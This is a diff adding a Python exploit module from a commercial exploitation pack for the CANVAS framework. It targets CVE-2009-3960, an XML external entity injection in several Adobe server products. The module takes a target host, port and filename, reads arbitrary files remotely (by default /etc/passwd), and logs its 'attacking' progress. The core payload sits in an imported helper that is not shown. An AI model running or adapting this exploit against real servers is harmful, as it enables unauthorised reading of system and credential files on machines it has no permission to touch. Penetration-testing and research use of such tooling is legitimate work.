@@ -1,0 +1,84 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os, string, time, re
+import pygtk
+import gobject
+import logging
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+sys.path.append(os.path.join(os.getcwd(), '3rdparty/D2SEC/libs'))
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+from canvasexploit import canvasexploit
+
+import appli.adobe
+
+# GUI info
+NAME = "d2sec_adobe"
+DESCRIPTION = "Adobe XML External Entity Injection Vulnerability"
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['Vendor'] = 'Adobe (http://www.adobe.com)'
+DOCUMENTATION["Repeatability"] = 'Infinite'
+DOCUMENTATION['Date public'] = '2009/11/16'
+DOCUMENTATION['References'] = 'http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf'
+DOCUMENTATION['Versions Affected'] = 'Multiple Adobe Products -- XML External Entity Injection. Affected Sofware: BlazeDS 3.2 and earlier versions, LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1, and 2.5.1, Flex Data Services 2.0.1, ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2'
+DOCUMENTATION["CVE Name"] = 'CVE-2009-3960'
+DOCUMENTATION["CVE Url"] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3960'
+DOCUMENTATION["Notes"] = """It's possible to read arbitrary files with this
+vulnerability. To specify a windows pathname, don't forget to escape
+antislash.  For example : c:\\windows\\boot.ini"""
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] , ["Linux"], ["MAC OS X"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 80
+    self.filename = '/etc/passwd'
+    
+  def run(self):
+    self.host = self.target.interface	
+    self.port = int(self.argsDict.get('port', self.port))
+    self.filename = self.argsDict.get('filename', self.filename)
+
+    self.setInfo('[D2 LOG] %s attacking %s - running' % (NAME,self.host))
+    nfo = appli.adobe.adobe_xml_injection(self.host, self.port, self.filename)
+    if nfo:
+      self.result = nfo
+      self.log('[D2 LOG] %s' % nfo)
+      self.setInfo('[D2 LOG] %s attacking %s - done' % (NAME,self.host))
+      return 1
+    self.setInfo('[D2 LOG] %s attacking %s - failed' % (NAME,self.host))
+    return 0
+
+  def usage(self):
+  	print 'Usage: %s -t host -p port -O filename:<filename>' % sys.argv[0]
+  	return
+
+if __name__ == '__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
